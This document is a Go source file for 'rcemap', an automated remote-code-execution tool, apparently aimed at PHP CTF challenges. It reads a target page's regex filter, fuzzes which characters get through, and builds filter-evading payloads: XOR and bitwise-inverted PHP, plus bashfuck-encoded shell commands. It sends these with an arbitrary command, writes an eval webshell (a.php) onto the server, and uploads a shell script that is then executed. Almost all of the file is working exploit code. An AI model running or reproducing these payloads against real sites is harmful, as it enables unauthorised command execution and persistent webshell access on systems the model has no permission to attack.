package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"

	"github.com/PuerkitoBio/goquery"
	"golang.org/x/text/encoding/charmap"
)

var i string
var command string
var v int
var m string

const WARNING = "\x1b[31m [WARNING] \x1b[39m" //红色的WARNING
const inf = "\x1b[36m [INFO] \x1b[39m"        //蓝色的INFO

/*接下来是对探姬大佬的bashfuck工具重构后的代码



-----------------分割线----------------




*/

func info(s string) string {
	total := 0
	usedChars := make(map[rune]bool)
	for _, c := range s {
		if c >= 32 && c <= 126 && !usedChars[c] {
			total++
			usedChars[c] = true
		}
	}
	var sb strings.Builder

	sb.WriteString(fmt.Sprintf("%s", s))
	return sb.String()
}

func getOct(c rune) string {
	return fmt.Sprintf("%o", c)
}

func CommonOtc(cmd string) string {
	var payload strings.Builder
	payload.WriteString("$'")
	for _, c := range cmd {
		if c == ' ' {
			payload.WriteString("' $'")
		} else {
			payload.WriteString(fmt.Sprintf("\\%s", getOct(c)))
		}
	}
	payload.WriteString("'")
	return info(payload.String())
}

func BashfuckX(cmd string, form string) string {
	var bashStr strings.Builder
	for _, c := range cmd {
		bashStr.WriteString(fmt.Sprintf("\\\\$(($((1<<1))#%b))", c))
	}
	payloadBit := bashStr.String()
	payloadZero := strings.ReplaceAll(payloadBit, "1", "${##}")
	payloadC := strings.ReplaceAll(payloadZero, "0", "${#}")
	switch form {
	case "bit":
		payloadBit = fmt.Sprintf("$0<<<$0\\\\<\\\\<\\\\<\\$\\'%s\\'", payloadBit)
		return info(payloadBit)
	case "zero":
		payloadZero = fmt.Sprintf("$0<<<$0\\\\<\\\\<\\\\<\\$\\'%s\\'", payloadZero)
		return info(payloadZero)
	case "c":
		payloadC = fmt.Sprintf("${!#}<<<${!#}\\\\<\\\\<\\\\<\\$\\'%s\\'", payloadC)
		return info(payloadC)
	default:
		return ""
	}
}

func BashfuckY(cmd string) string {
	octList := []string{
		"$(())",
		"$((~$(($((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
		"$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))",
	}
	var bashFuck strings.Builder
	bashFuck.WriteString("__=$(())")
	bashFuck.WriteString("&&")
	bashFuck.WriteString("${!__}<<<${!__}\\\\<\\\\<\\\\<\\$\\'")
	for _, c := range cmd {
		bashFuck.WriteString("\\\\")
		for _, i := range getOct(c) {
			index := i - '0'
			bashFuck.WriteString(octList[index])
		}
	}
	bashFuck.WriteString("\\'")
	return info(bashFuck.String())
}

/*
至此,重构结束



-----------------分割线----------------



*/

//这是对qufan.py进行重构得到的函数

func qufan(c string) string {
	// 在 Latin-1 编码下将字符串转换为字节流
	encoder := charmap.ISO8859_1.NewEncoder()
	latinBytes, err := encoder.Bytes([]byte(c))
	if err != nil {
		fmt.Println("编码失败:", err)
		return ""
	}

	// 计算取反后的字节流
	invertedBytes := make([]byte, len(latinBytes))
	for i, b := range latinBytes {
		invertedBytes[i] = ^b
	}

	// 将取反后的字节流转换为 Latin-1 编码下的字符串
	invertedString := string(invertedBytes)

	return invertedString
}

// 显示帮助内容

func displayHelp() {
	helpText := `
使用方法:
	go run rcemap.go 或者 ./rcemap.exe --help

选项:
	--help   显示帮助信息
	-u 目标url
	-i 参数点
	-c 需要执行的命令
	-v 输出当前php版本（默认为7）
	-m 设置请求方式为GET还是POST（默认为GET,请大写不然报错）
	...
	`

	fmt.Println(helpText)
}

// 使用 goquery 库的 Selection.Text() 方法获取去除了 HTML 标签的纯文本
func removeHTMLTags(html string) string {
	doc, err := goquery.NewDocumentFromReader(strings.NewReader(html))
	if err != nil {
		log.Fatal(err)
	}

	return doc.Text()
}

// 设置目标和接收参数
func target() string {

	flag.StringVar(&i, "i", "", "参数点")
	flag.StringVar(&command, "c", "", "命令")
	flag.IntVar(&v, "v", 7, "参数点")
	flag.StringVar(&m, "m", "GET", "请求方式")
	url := flag.String("u", "", "target url")
	helpFlag := flag.Bool("help", false, "显示帮助信息")
	flag.Parse()
	if *helpFlag {
		displayHelp()
		os.Exit(0)
	}
	fmt.Println(inf + "URL: " + *url)
	return *url
}

// logo

func Logo() {
	Logo := `
	
██████╗  ██████╗███████╗███╗   ███╗ █████╗ ██████╗ 
██╔══██╗██╔════╝██╔════╝████╗ ████║██╔══██╗██╔══██╗
██████╔╝██║     █████╗  ██╔████╔██║███████║██████╔╝
██╔══██╗██║     ██╔══╝  ██║╚██╔╝██║██╔══██║██╔═══╝ 
██║  ██║╚██████╗███████╗██║ ╚═╝ ██║██║  ██║██║     
╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝      
	`

	fmt.Printf(Logo + "\n")
	fmt.Printf("\033[32m Author: Pr1nt \033[39m\n")
	fmt.Printf("\033[32m Version: v0.3 \033[39m\n")

}

//前面都是其他的函数，从此处开始为主要函数，也是需要经常修改的函数

var cleanText string
var guolv string

func test(url string) {
	var response *http.Response
	var err error
	if m == "GET" {
		response, err = http.Get(url)
		if err != nil {
			fmt.Println("Error creating GET request:", err)
			return
		}

	} else {
		fmt.Println("Invalid request method")
		return
	}

	defer response.Body.Close()

	doc, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)
		return
	}

	preg_match := "preg_match"
	preg_replace := "preg_replace"
	lines := strings.Split(string(doc), "\n")

	found := false
	for _, line := range lines {
		cleanText = removeHTMLTags(line)
		if strings.Contains(cleanText, preg_match) {

			fmt.Printf(inf+"发现过滤: %s\n", preg_match)
			fmt.Printf(inf + "题目源码如下: \n" + cleanText + "\n")

			// 使用正则表达式提取括号内的内容
			re := regexp.MustCompile(`preg_match\("([^"]+)"`)
			matches := re.FindStringSubmatch(cleanText)

			if len(matches) > 1 {
				guolv = matches[1]
				fmt.Printf(inf+"发现过滤为: %s\n", guolv)
			} else {
				re = regexp.MustCompile(`preg_match\('([^']+)'`)
				matches = re.FindStringSubmatch(cleanText)
				if len(matches) > 1 {
					guolv = matches[1]
					fmt.Printf(inf+"发现过滤为: %s\n", guolv) // 输出过滤内容及括号内的匹配内容
				} //草泥马的就你一次匹配不好使呗，那老子两次匹配就完了呗

			}

			a_z := regexp.MustCompile(`a-z`)       // 匹配小写字母 a-z
			zero_nine := regexp.MustCompile(`0-9`) // 匹配数字 0-9

			if a_z.MatchString(guolv) || zero_nine.MatchString(guolv) { //其他情况等待施工中

				//如果是无数字字母题目

				fmt.Println(inf + "经典无数字字母RCE题目")

				if strings.Contains(string(cleanText), "eval") {

					//eval环境下的无数字字母分好多种
					if strings.Contains(guolv, "$") {

						fmt.Println(inf + "执行eval函数")
						fmt.Println(inf + "普通无数字字母需要利用$，这里被过滤了，只能使用进阶版")
						if !strings.Contains(guolv, "(") || !strings.Contains(guolv, ")") || !strings.Contains(guolv, "~") || !strings.Contains(guolv, ";") {
							v = 7
							noshuzievaljinjie(url) //无数字字母进阶的eval两种版本施工完毕
						} else if !strings.Contains(guolv, ".") || !strings.Contains(guolv, "/") || !strings.Contains(guolv, "?") || !strings.Contains(guolv, "[") || !strings.Contains(guolv, "-") || !strings.Contains(guolv, "@") || !strings.Contains(guolv, "]") {
							v = 5
							noshuzievaljinjie(url)
						} else {
							fmt.Println(WARNING + "老弟你全给过滤了我咋做啊")
						}
					} else {

						fmt.Println(inf + "既然$没有被过滤，那么这里有自增异或两种方法")

						if !strings.Contains(guolv, "^") || !strings.Contains(guolv, "$") || !strings.Contains(guolv, "(") || !strings.Contains(guolv, ")") || !strings.Contains(guolv, "'") || !strings.Contains(guolv, ".") || !strings.Contains(guolv, "_") || !strings.Contains(guolv, ";") || !strings.Contains(guolv, "[") || !strings.Contains(guolv, "]") {
							fmt.Println(inf + "可以使用异或")
							xor(url)
						} else if !strings.Contains(guolv, "$") || !strings.Contains(guolv, "_") || !strings.Contains(guolv, "+") || !strings.Contains(guolv, ";") || !strings.Contains(guolv, ".") {

							fmt.Println(inf + "可以使用自增")
							zizeng(url) //等待施工
						}

					}

				} else if strings.Contains(string(cleanText), "system") {

					fmt.Println(inf + "执行system函数")
					noshuzisystem(url) //无数字字母的system不分版本施工完毕

				} else {
					fmt.Println(WARNING + "这是什么题目QAQ")
					os.Exit(0) //看不懂题目，自动退出
				}

			} else {
				break
				//其他过滤情况，需要使用fuzz
			}

			found = true
			break

		} else if strings.Contains(cleanText, preg_replace) {
			//replace过滤
			fmt.Printf(inf+"发现过滤: %s\n", preg_replace)
			fmt.Printf(inf + "题目源码如下: \n" + cleanText + "\n")
			re := regexp.MustCompile(`(?i)preg_replace\("([^"]+)"`)
			matches := re.FindStringSubmatch(cleanText)

			if len(matches) > 1 {
				guolv = matches[1]
				fmt.Printf(inf+"发现过滤为: %s\n", guolv)
			} else {
				re = regexp.MustCompile(`preg_replace\('([^']+)'`)
				matches = re.FindStringSubmatch(cleanText)
				if len(matches) > 1 {
					guolv = matches[1]
					fmt.Printf(inf+"发现过滤为: %s\n", guolv)
				}

			}
			found = true
			break
			//等待施工中

		}

	}

	if !found {
		fmt.Println(WARNING + "未发现过滤")
		fuzz(url)
		//等待施工中
	}

}

func zizeng(URL string) {

}
func xor(URL string) {
	var newURL string
	var payload string
	if v == 5 {
		newURL = URL + "?" + i + "=" + "$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');$___=$$__;$_($___[_]);"
		fmt.Printf(inf+"POC为: %s\n", newURL)
		fmt.Printf("\033[33m" + "[Tips] " + "\033[39m" + "请注意,这里的command应该是如phpinfo();这样格式的\n")
		payload = "_=" + command
	} else if v == 7 {
		newURL = URL + "?" + i + "=" + "$_=('%06'^'`').('%09'^'`').('%0c'^'`').('%05'^'`').'_'.('%10'^'`').('%15'^'`').('%14'^'`').'_'.('%03'^'`').('%0f'^'`').('%0e'^'`').('%14'^'`').('%05'^'`').('%0e'^'`').('%14'^'`').('%13'^'`');$__=('%01'^'`').'.'.('%10'^'`').('%08'^'`').('%10'^'`');$___='<?'.('%10'^'`').('%08'^'`').('%10'^'`').' '.('%05'^'`').('%16'^'`').('%01'^'`').('%0c'^'`').'($_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']').'[_]);?>';$____=$_($__,$___);"
		fmt.Printf(inf+"POC为: %s\n", newURL)
		fmt.Printf("\033[33m" + " [Tips] " + "\033[39m" + "请注意,这里的command应该是如phpinfo();这样格式的\n")
		http.Get(newURL)
		newURL = URL + "/../a.php" //生成并访问a.php,a.php代码为<?php eval($_POST[_]);?>
		payload = "_=" + command
	}

	client := &http.Client{}

	// 创建一个 POST 请求
	request, err := http.NewRequest("POST", newURL, strings.NewReader(payload))
	if err != nil {
		fmt.Println("创建请求时发生错误:", err)
		return
	}

	// 设置 Content-Type 头部
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// 发送请求
	response, err := client.Do(request)
	if err != nil {
		fmt.Println(WARNING+"发送请求时发生错误:", err)
		return
	}
	defer response.Body.Close()

	// 读取响应数据
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		fmt.Println(WARNING+"读取响应时发生错误:", err)
		return
	}

	// 打印响应结果
	fmt.Println(inf+"回显为:", removeHTMLTags(string(body)))
}

func noshuzievaljinjie(url string) {
	var c1 string
	var c2 string
	leftIndex := strings.Index(command, "(")
	if leftIndex == -1 {
		// 字符串中没有左括号
		c1 = command
		c2 = ""
	}

	// 查找第一个右括号的索引
	rightIndex := strings.Index(command, ")")
	if rightIndex == -1 {
		// 字符串中没有右括号
		c1 = ""
		c2 = ""
	}
	var c3 string
	if leftIndex < rightIndex {
		// 括号正确匹配，提取括号内外的内容
		c1 = command[:leftIndex]
		c2 = command[leftIndex+1 : rightIndex]

		c2 = qufan(c2)

		c3 = "~" + c2

	} else {
		// 括号不正确匹配
		c1 = command
		c2 = ""
	}
	var rec string
	if v == 7 {
		fmt.Println(inf + "PHP版本为7.x")

		POC := qufan(c1)

		command = "(~" + POC + ")(" + c3 + ");"
		fmt.Printf(inf+"POC为: %s\n", command)

	} else if v == 5 {
		fmt.Println(inf + "PHP版本为5.x")
		rec = "?><?=`. /???/????????[@-[]`;?>"
		m = "POST"
	}

	if m == "GET" {

		res, err := http.Get(url + "?" + i + "=" + command)
		if err != nil {
			log.Fatal(err)
		}
		defer res.Body.Close()

		body, err := ioutil.ReadAll(res.Body)

		REres := removeHTMLTags(string(body))
		fmt.Printf(inf+"回显为: %s \n", REres) //如果是GET方式就直接GET

	} else if m == "POST" {
		reurl := url + "?" + i + "=" + rec
		fileContent := []byte("#!/bin/sh\n\n" + command)

		body := &bytes.Buffer{}
		writer := multipart.NewWriter(body)

		// 创建一个文件字段，并将文件数据写入其中
		fileField, err := writer.CreateFormFile("file", "1.txt")
		if err != nil {
			fmt.Println("创建表单文件字段失败:", err)
			return
		}
		_, err = fileField.Write(fileContent)
		if err != nil {
			fmt.Println("写入文件数据失败:", err)
			return
		}

		// 完成表单数据的写入
		err = writer.Close()
		if err != nil {
			fmt.Println("关闭表单写入器失败:", err)
			return
		}
		req, err := http.NewRequest("POST", reurl, body)
		if err != nil {
			fmt.Println("创建 POST 请求失败:", err)
			return
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())

		// 发送请求
		client := http.DefaultClient
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("发送 POST 请求失败:", err)
			return
		}
		defer resp.Body.Close()

		// 读取响应
		respBody, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("读取响应失败:", err)
			return
		}

		// 输出响应
		fmt.Println("POST 请求响应:")
		fmt.Println(string(respBody))
	}

}

var char string

func noshuzisystem(URL string) {
	fmt.Printf(inf + "这是一个system命令，我们需要利用linux终端的一些特性来完成\n")
	fmt.Printf(inf + "本函数基于探姬大佬的bashfuck工具进行二开，原项目地址：https://github.com/ProbiusOfficial/bashFuck\n")
	char = fuzz(URL)
	re := regexp.MustCompile("[" + guolv + "]")
	char = re.ReplaceAllString(char, "")

	var rec string
	var req *http.Request
	client := &http.Client{}
	var err error
	fmt.Println(inf + "fuzz结果为：" + char)

	if strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '1') && strings.ContainsRune(char, '2') && strings.ContainsRune(char, '3') && strings.ContainsRune(char, '4') && strings.ContainsRune(char, '5') && strings.ContainsRune(char, '6') && strings.ContainsRune(char, '7') && strings.ContainsRune(char, '\\') {

		rec = CommonOtc(command)
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '1') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') {

		rec = BashfuckX(command, "bit")
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '0') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') {

		rec = BashfuckX(command, "zero")
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '!') && strings.ContainsRune(char, '#') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') {

		rec = BashfuckX(command, "c")
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else if strings.ContainsRune(char, '!') && strings.ContainsRune(char, '$') && strings.ContainsRune(char, '&') && strings.ContainsRune(char, '\'') && strings.ContainsRune(char, '(') && strings.ContainsRune(char, ')') && strings.ContainsRune(char, '<') && strings.ContainsRune(char, '=') && strings.ContainsRune(char, '{') && strings.ContainsRune(char, '}') && strings.ContainsRune(char, '~') && strings.ContainsRune(char, '\\') && strings.ContainsRune(char, '_') {

		rec = BashfuckY(command)
		fmt.Printf(inf + "POC为: " + rec + "\n")

	} else {
		fmt.Println(WARNING + "bashfuck失灵了呜呜呜,你自己额外去想构造吧")
	}

	newURL := fmt.Sprintf("%s?%s=%s", URL, i, url.QueryEscape(rec))

	// 创建请求对象
	if m == "GET" {
		req, err = http.NewRequest("GET", newURL, nil)
		if err != nil {
			fmt.Println("Error creating GET request:", err)

		}
	} else if m == "POST" {

		payload := []byte(i + "=" + command)

		// 发起 POST 请求
		resp, err := http.Post(URL, "application/x-www-form-urlencoded", bytes.NewBuffer(payload))
		if err != nil {
			fmt.Println("发送 POST 请求失败:", err)
			return
		}
		defer resp.Body.Close()

		// 读取响应
		respBody, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("读取响应失败:", err)
			return
		}

		// 输出响应
		fmt.Println("POST 请求响应:")
		fmt.Println(string(respBody))

	} else {
		fmt.Println("无效请求方式")
	}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error sending request:", err)

	}
	defer resp.Body.Close()

	// 读取响应内容
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response body:", err)

	}

	result := strings.Replace(removeHTMLTags(string(body)), cleanText, "", -1)
	fmt.Printf(inf+"执行结果为: %s\n", result)
}

/*

这是一个fuzz功能的函数，能够输出输入后的回显

*/

func fuzz(URL string) string {
	result := ""
	fmt.Println(inf + "即将进行fuzz测试")
	client := &http.Client{}

	var req *http.Request
	var err error
	var char string

	for ch := 32; ch <= 126; ch++ {
		char = fmt.Sprintf("%c", ch)

		//char = url.QueryEscape(char)
		newURL := fmt.Sprintf("%s?%s=%s", URL, i, char)

		// 创建请求对象
		if m == "GET" {
			req, err = http.NewRequest("GET", newURL, nil)
			if err != nil {
				fmt.Println("Error creating GET request:", err)

			}
		} else if m == "POST" {
			req, err = http.NewRequest("POST", newURL, strings.NewReader(i))
			if err != nil {
				fmt.Println("Error creating POST request:", err)

			}
			req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		} else {
			fmt.Println("无效请求方式")

		}

		// 发送请求
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending request:", err)

		}
		defer resp.Body.Close()

		// 读取响应内容
		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("Error reading response body:", err)

		}

		res := removeHTMLTags(string(body))
		// 比较回显与题目，并输出差异
		cleanResponse := strings.Replace(res, cleanText, "", -1)
		cleanText = strings.TrimSpace(cleanText)
		cleanResponse = strings.TrimSpace(cleanResponse)

		if cleanResponse == "" {
			//fmt.Printf(inf+"该字符可用: %s\n", char)
			result += char
			continue
		} else {
			//fmt.Printf(WARNING+"该字符不可用: %s\n", char)
			continue
		}

	}
	return result
}

func main() {
	Logo()
	url := target()
	test(url)
}
